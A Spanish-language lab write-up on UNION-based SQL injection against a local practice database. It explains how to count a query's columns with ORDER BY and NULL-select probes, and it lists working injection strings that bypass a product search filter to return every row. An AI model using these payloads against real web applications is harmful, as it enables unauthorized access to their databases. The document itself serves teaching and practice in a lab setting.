
# Previo

Tiene que ser con un phpmyadmin antiguo.
Importamos la BBDD databases.sql


# Saber el número de columnas de la tabla que afecta al formulario
Para que una consulta UNION funcione, se deben cumplir dos requisitos clave:
- Las consultas individuales deben devolver el mismo número de columnas.
- Los tipos de datos de cada columna deben ser compatibles entre las consultas individuales.

Cómo determinar del número de columnas requeridas en un ataque UNION de inyección SQL:
- El primer método consiste en inyectar una serie de cláusulas ORDER BY e incrementar el índice de columna especificado hasta que se produzca un error. Por ejemplo, vamos probando hasta que obtengamos un error, en nuestro caso:
  ```
  999' or '1'='1' UNION SELECT * from articulos order by 4 #
  ```

- El segundo método consiste en enviar una serie de cargas útiles de UNION SELECT que especifican un número diferente de valores nulos. Vamos probando:
  ```
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT NULL,NULL,NULL–
  ```
  La aplicación podría devolver este mensaje de error, o simplemente podría devolver un error genérico o ningún resultado. Cuando el número de valores nulos coincide con el número de columnas, la base de datos devuelve una fila adicional en el conjunto de resultados, que contiene valores nulos en cada columna.


# Consulta que muestra todos los productos
![](capturas/sql-injection-lab1.png)

![](capturas/sql-injection-lab1-2.png)

![](capturas/sql-injection-lab1-3.png)


Consulta SQL:
```
SELECT * from articulos where Nombre = '999' or '1'='1' UNION SELECT null, null, null from articulos #
```
Inyecciones que muestran todos los productos:
```
999' or '1'='1' UNION SELECT null, null, null from articulos #
999' or '1'='1' UNION SELECT * from articulos #
```



